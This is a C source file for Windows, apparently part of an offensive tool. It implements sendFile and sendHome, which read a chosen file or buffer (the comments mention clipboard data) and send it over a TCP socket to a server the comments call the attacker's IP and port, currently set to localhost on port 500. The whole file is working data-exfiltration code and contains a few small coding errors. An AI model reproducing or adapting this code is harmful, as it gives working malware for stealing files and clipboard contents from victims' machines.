#include <winsock2.h>
#include <Ws2tcpip.h>
#include <MSWSock.h>

#include "config.h"

#pragma comment(lib, "Mswsock.lib ")
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996) 

int sendFile()
{
	TCHAR input[MAX_PATH];
	char path[MAX_PATH];
	size_t sizeConverted;

	//Get filepath from the user.
	_tprintf(_T("File path: "));
	_getts_s(input, MAX_PATH);

	//Convert TCHAR to char buffer.
	if (wcstombs_s(&sizeConverted, path, MAX_PATH, input, MAX_PATH))
	{
		_tprintf(_T("ERROR: wcstombs_s function call failed."));
		return 1;
	}

	//Sends clipboard data to sendHome function 
	//to be sent to designated Attackers IP. 
	if (sendHome(path, 1))
	{
		_tprintf(_T("ERROR: sendHome function failed.", ));
		return 1;
	}

	return 0;
}

int sendHome(char* buffer, int file)
{
	WSADATA wsaData;
	SOCKET sock = INVALID_SOCKET;
	LARGE_INTEGER liFileSize;

	struct sockaddr_in home;
	int receivedSize = 1024;
	char receivedBuffer[1024];

	//ATTACKER'S PORT AND IP ADDRESS.
	const char* homeIP = "127.0.0.1";
	u_short homePort = 500;

	//The sockaddr_in structure specifies the address family,
	//IP address, and port of the server to be connected to.
	home.sin_family = AF_INET;
	home.sin_addr.s_addr = inet_addr(homeIP);
	home.sin_port = htons(homePort);

	//Initialize Winsock.
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != NO_ERROR)
	{
		return 1;
	}

	//Create a SOCKET for connecting to server.
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		WSACleanup();
		return 1;
	}

	//Connect to Attacker's server.
	result = connect(sock, (SOCKADDR*)&home, sizeof(home));
	if (result == SOCKET_ERROR)
	{
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	//Check whether the data coming in is a file or data.
	if (file)
	{
		//Open the file the user selected.
		HANDLE handle = CreateFileA(buffer, GENERIC_READ, FILE_SHARE_READ, NULL,
			OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

		if (handle == INVALID_HANDLE_VALUE)
		{
			_tprintf(_T("ERROR: Can't open handle %ld\n"));
			closesocket(sock);
			WSACleanup();
			return 1;
		}

		//Get file size. 
		GetFileSize(handle, NULL);
		if (GetFileSizeEx(handle, &liFileSize) == FALSE)
		{
			_tprintf(_T("ERROR: GetFileSize %ld\n"));
			closesocket(sock);
			WSACleanup();
			return 1;
		}

		//Send files using TransmitFile to Attacker's server.
		if (TransmitFile(sock, handle, 0, 0, NULL, NULL, TF_USE_DEFAULT_WORKER) == FALSE)
		{
			_tprintf(_T("TransmitFile function failed with error: %ld\n"), WSAGetLastError());
			closesocket(sock);
			WSACleanup();

			if (!CloseHandle(handle))
			{
				_tprintf(_T("ERROR: CloseHandle function call."));
				return 1;
			}

			return 1;
		}

		//Close handle.
		if (!CloseHandle(handle))
		{
			_tprintf(_T("ERROR: CloseHandle function call."));
			return 1;
		}
	}
	else
	{
		//Send data to the Attacker's server.
		result = send(sock, buffer, (int)strlen(buffer), 0);
		if (result == SOCKET_ERROR)
		{
			closesocket(sock);
			WSACleanup();
			return 1;
		}

		//Shutdown the connection since no more data will be sent.
		result = shutdown(sock, SD_SEND);
		if (result == SOCKET_ERROR)
		{
			closesocket(sock);
			WSACleanup();
			return 1;
		}

		//Receive data until the peer closes the connection.
		do
		{
			result = recv(sock, receivedBuffer, receivedSize, 0);
			if (result > 0)
			{
				_tprintf(_T("Bytes received: %d\n"), result);
				printf("%s", receivedBuffer);
			}
			else if (result == 0)
			{
				_tprintf(_T("Connection closed\n"));
			}
			else
			{
				_tprintf(_T("recv failed with error: %d\n"), WSAGetLastError());
			}

		} while (result > 0);
	}

	//Close the socket.
	result = closesocket(sock);
	if (result == SOCKET_ERROR)
	{
		_tprintf(_T("ERROR: closesocket"));
		WSACleanup();
		return 1;
	}

	WSACleanup();
	return 0;
}
